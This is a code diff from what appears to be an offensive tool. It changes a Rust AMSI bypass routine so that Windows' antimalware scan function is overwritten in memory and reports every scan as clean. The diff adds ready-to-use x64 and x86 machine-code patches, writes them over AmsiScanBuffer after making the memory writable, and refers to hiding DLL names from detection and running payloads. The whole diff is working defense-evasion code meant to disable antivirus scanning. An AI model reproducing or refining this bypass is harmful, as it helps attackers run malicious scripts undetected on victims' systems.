@@ -5,6 +5,30 @@ use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
 use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
 use windows::Win32::System::Threading::GetCurrentProcess;
 
+/// The bytes written over `AmsiScanBuffer`'s prologue.
+///
+/// It returns `S_OK` (`eax = 0`) *and* stores `AMSI_RESULT_CLEAN` (0) in the
+/// sixth argument (the caller's `AMSI_RESULT*`), so a caller that reads the
+/// result — `System.Management.Automation` does, on every script it compiles —
+/// sees "clean" instead of uninitialized memory.
+#[cfg(target_arch = "x86_64")]
+const AMSI_PATCH: [u8; 11] = [
+    0x29, 0xC0, // sub eax, eax
+    0x4C, 0x8B, 0x54, 0x24, 0x30, // mov r10, [rsp+0x30]  (6th arg: AMSI_RESULT*)
+    0x41, 0x89, 0x02, // mov [r10], eax
+    0xC3, // ret
+];
+
+/// The 32-bit variant: the `AMSI_RESULT*` is the sixth stack argument and the
+/// `stdcall` callee pops all six (24 bytes).
+#[cfg(target_arch = "x86")]
+const AMSI_PATCH: [u8; 11] = [
+    0x31, 0xC0, // xor eax, eax
+    0x8B, 0x54, 0x24, 0x18, // mov edx, [esp+0x18]  (6th arg: AMSI_RESULT*)
+    0x89, 0x02, // mov [edx], eax
+    0xC2, 0x18, 0x00, // ret 0x18
+];
+
 /// Errors produced while patching the scan function.
 #[derive(Debug, thiserror::Error)]
 pub enum PatchAmsiError {
@@ -18,12 +42,14 @@ pub enum PatchAmsiError {
     RestoreProtectionFailed,
 }
 
-/// Patches `AmsiScanBuffer` in the current process so it always returns `S_OK`.
+/// Patches `AmsiScanBuffer` in the current process so it reports every scan as
+/// clean.
 ///
-/// The patch is `sub eax, eax; ret` (`29 C0 C3`): it zeroes EAX (S_OK) and
-/// returns immediately, so any AMSI scan reports "clean". It only affects the
-/// current process; if the payload later runs in another process (e.g. process
-/// hollowing), that process's AMSI is not patched here.
+/// The patch returns `S_OK` **and** stores `AMSI_RESULT_CLEAN` (0) in the
+/// caller's out-parameter. Writing only `sub eax, eax; ret` leaves that
+/// parameter untouched, and a caller that reads it (`System.Management.Automation`
+/// does, on every script it compiles) then sees uninitialized memory — which
+/// makes the scan result non-deterministic.
 ///
 /// The DLL and function names are substituted at build time by
 /// `Params::render_fragment` with code that rebuilds them at runtime, so they
@@ -48,12 +74,15 @@ pub fn patch_amsi() -> Result<bool, PatchAmsiError> {
     let target = address as usize as *mut u8;
     crate::tech_dbg!("patch_amsi", "resolved target at {target:p}");
 
-    // 3. Make the first three bytes writable.
+    // 3. Make the patch bytes writable. The patch is longer than a `ret`:
+    //    besides returning `S_OK` it also writes `AMSI_RESULT_CLEAN` (0) to the
+    //    caller's out-parameter, so a scan never reports uninitialized memory.
+    let patch: &[u8] = &AMSI_PATCH;
     let mut old_protect = 0u32;
     let status = crate::nt_protect_vm(
         unsafe { GetCurrentProcess() },
         target as *mut core::ffi::c_void,
-        3,
+        patch.len(),
         PAGE_EXECUTE_READWRITE.0,
         &mut old_protect,
     );
@@ -61,18 +90,16 @@ pub fn patch_amsi() -> Result<bool, PatchAmsiError> {
         return Err(PatchAmsiError::MakeWritableFailed);
     }
 
-    // 4. Write `sub eax, eax; ret`.
+    // 4. Write the patch.
     unsafe {
-        *target = 0x29;
-        *target.add(1) = 0xC0;
-        *target.add(2) = 0xC3;
+        std::ptr::copy_nonoverlapping(patch.as_ptr(), target, patch.len());
     }
 
     // 5. Restore the original protection.
     let status = crate::nt_protect_vm(
         unsafe { GetCurrentProcess() },
         target as *mut core::ffi::c_void,
-        3,
+        patch.len(),
         old_protect,
         &mut old_protect,
     );
@@ -81,7 +108,8 @@ pub fn patch_amsi() -> Result<bool, PatchAmsiError> {
     }
     crate::tech_dbg!(
         "patch_amsi",
-        "wrote sub eax, eax; ret and restored the original protection"
+        "wrote {} patch bytes and restored the original protection",
+        patch.len()
     );
 
     // A Preparation always continues the pipeline; only the `bouncer` gate
